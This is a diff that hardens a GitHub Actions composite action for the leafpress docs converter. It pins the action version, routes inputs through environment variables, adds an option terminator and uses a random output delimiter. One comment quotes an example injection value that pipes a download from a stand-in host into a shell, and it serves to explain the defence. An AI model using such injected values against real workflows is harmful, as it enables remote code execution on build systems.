@@ -49,37 +49,56 @@ runs:
           libfontconfig1
 
     - name: Set up Python
-      uses: actions/setup-python@v5
+      uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
       with:
         python-version: ${{ inputs.python_version }}
         cache: pip
 
+    # Install leafpress from this action's own checkout so `uses: hutchins/leafpress@<ref>`
+    # runs exactly the code at that ref, not whatever is newest on PyPI.
     - name: Install leafpress
       shell: bash
-      run: pip install 'leafpress[pdf]'
+      env:
+        ACTION_PATH: ${{ github.action_path }}
+      run: pip install "${ACTION_PATH}[pdf]"
 
+    # Inputs are passed through env vars, never interpolated into the script,
+    # so a value like `"; curl evil | sh; #` stays a plain string.
     - name: Convert docs
       id: convert
       shell: bash
+      env:
+        INPUT_SOURCE: ${{ inputs.source }}
+        INPUT_FORMAT: ${{ inputs.format }}
+        INPUT_OUTPUT: ${{ inputs.output }}
+        INPUT_CONFIG: ${{ inputs.config }}
+        INPUT_COVER_PAGE: ${{ inputs.cover_page }}
+        INPUT_TOC: ${{ inputs.toc }}
+        INPUT_LOCAL_TIME: ${{ inputs.local_time }}
       run: |
-        LEAFPRESS_ARGS=("${{ inputs.source }}" "-f" "${{ inputs.format }}" "-o" "${{ inputs.output }}")
-        if [ -n "${{ inputs.config }}" ]; then
-          LEAFPRESS_ARGS+=("-c" "${{ inputs.config }}")
+        LEAFPRESS_ARGS=("-f" "$INPUT_FORMAT" "-o" "$INPUT_OUTPUT")
+        if [ -n "$INPUT_CONFIG" ]; then
+          LEAFPRESS_ARGS+=("-c" "$INPUT_CONFIG")
         fi
-        if [ "${{ inputs.cover_page }}" = "false" ]; then
+        if [ "$INPUT_COVER_PAGE" = "false" ]; then
           LEAFPRESS_ARGS+=("--no-cover-page")
         fi
-        if [ "${{ inputs.toc }}" = "false" ]; then
+        if [ "$INPUT_TOC" = "false" ]; then
           LEAFPRESS_ARGS+=("--no-toc")
         fi
-        if [ "${{ inputs.local_time }}" = "true" ]; then
+        if [ "$INPUT_LOCAL_TIME" = "true" ]; then
           LEAFPRESS_ARGS+=("--local-time")
         fi
-        leafpress convert "${LEAFPRESS_ARGS[@]}"
-        FILES=$(find "${{ inputs.output }}" -type f 2>/dev/null | sort)
-        echo "files<<EOF" >> $GITHUB_OUTPUT
-        echo "$FILES" >> $GITHUB_OUTPUT
-        echo "EOF" >> $GITHUB_OUTPUT
+        # `--` ends option parsing so a source starting with `-` can't become a flag
+        leafpress convert "${LEAFPRESS_ARGS[@]}" -- "$INPUT_SOURCE"
+        FILES=$(find "$INPUT_OUTPUT" -type f 2>/dev/null | sort)
+        # Random heredoc delimiter so file names can't inject extra outputs
+        DELIM="EOF_$(openssl rand -hex 16)"
+        {
+          echo "files<<$DELIM"
+          echo "$FILES"
+          echo "$DELIM"
+        } >> "$GITHUB_OUTPUT"
 
 branding:
   icon: file-text
